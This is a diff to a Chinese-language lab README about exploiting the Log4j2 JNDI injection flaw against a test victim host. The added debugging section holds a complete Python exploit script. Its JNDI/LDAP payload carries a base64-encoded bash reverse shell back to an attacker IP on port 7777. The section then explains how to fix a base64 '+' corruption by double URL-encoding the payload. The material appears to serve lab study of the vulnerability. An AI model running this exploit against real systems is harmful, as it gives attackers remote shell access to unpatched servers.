@@ -86,8 +86,6 @@ sudo apt update && sudo apt install jq
 
 ![](.assets_img/README/vulfocus_web.png)
 
-![](.assets_img/README/tomcat_base64_missing.png)
-
 ## 漏洞利用
 
 ### JNDI 注入利用工具
@@ -170,6 +168,102 @@ print(response.text)
 ### Demo
 
 [![asciicast](https://asciinema.org/a/667333.svg)](https://asciinema.org/a/667333)
+
+## Debug
+
+在使用以下的 `python` 脚本验证 `log4j2` 漏洞时，遇到了下面的问题：
+
+```python
+"""log4j2 JNDI 注入"""
+
+import base64
+import urllib.parse
+
+import requests
+
+# ATTACKER_HOSTNAME = "kali-attacker.mlab"
+ATTACKER_HOSTNAME = "192.168.56.162"
+VICTIM_HOSTNAME = "ubuntu-victim.mlab"
+
+shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"
+
+shell_redirection_bytes = shell_redirection.encode("ascii")
+shell_redirection_b64 = base64.b64encode(shell_redirection_bytes).decode("ascii")
+
+print(f"Encoded string: {shell_redirection_b64}")
+
+
+params = {
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
+    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
+    # + urllib.parse.quote_plus(shell_redirection_b64)
+    + shell_redirection_b64
+    + "}",
+}
+
+
+response = requests.get(
+    "http://ubuntu-victim.mlab:8080/hello",
+    params=params,
+    verify=False,
+    timeout=10,
+)
+
+print(response.request.url)
+print(response.text)
+```
+
+![](.assets_img/README/base64_unmatch.png)
+
+如上图所示，`base64` 编码后的字符串中含有 `+` 号，而 `+` 号在 `url 编码` 中表示 `空格`
+
+但是 `python requests` 包会自动将 `payload` 自动进行 `url 编码`，如上图所示，`+` 号被成功替换为了 `%2B`
+
+但是，在 **攻击者（Kali-Attacker）** 接收到 **被攻击服务器端（ubuntu-victim）** 的，其 `+` 被替换成了 `空格`——从而导致 `base64 解码失败`
+
+使用 `wireshark` 抓包排查通信过程：
+
+![](.assets_img/README/tomcat_base64_missing.png)
+
+可以看到 **攻击者（Kali-Attacker）** 在接收时，`+` 被替换成了 `空格`（错误 `base64` 形式）
+
+故可以初步推断 **被攻击服务器端（ubuntu-victim）** 在接收到 `url` 时，对于 `parameters` 部分后 **进行了 2 次 url 解码** 导致了上述问题
+
+对于上述表现，由于笔者没有查看 **被攻击服务器端（ubuntu-victim）** 对于 `url` 的解析代码，故无法给出准确的 **进行了 2 次 url 解码** 的原因。同时，查看 `jndi:ldap` 对于特殊字符的转义处理，也与 `url 编码` 标准不同（参见 [Special Characters](https://learn.microsoft.com/en-us/archive/technet-wiki/5392.active-directory-ldap-syntax-filters#Special_Characters)）
+
+但是出于解决问题的目的，我们的 `exp` 代码可以进行 `二次 url 编码`，从而解决上述问题。`编码` 部分的代码如下：
+
+```python
+params = {
+    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
+    + urllib.parse.quote_plus(shell_redirection_b64)  # 第一次 url 编码
+    + "}",
+}
+
+
+response = requests.get(
+    "http://ubuntu-victim.mlab:8080/hello",
+    params=params,  # requests 自动会进行第二次 url 编码
+    verify=False,
+    timeout=10,
+)
+```
+
+![](.assets_img/README/correct_base64_double_url_encoding.png)
+
+再在传输层面进行抓包验证：
+
+![](.assets_img/README/tomcat_base64_correct.png)
+
+再以 `+` 号为例，演示其编解码过程
+
+```
+攻击端（Kali-Attacker）：+ -> %2B -> %252B
+受害端（ubuntu-victim）：%252B -> %2B -> +
+```
+
+![](.assets_img/README/plus_double_decode.png)
 
 ## 参考
 
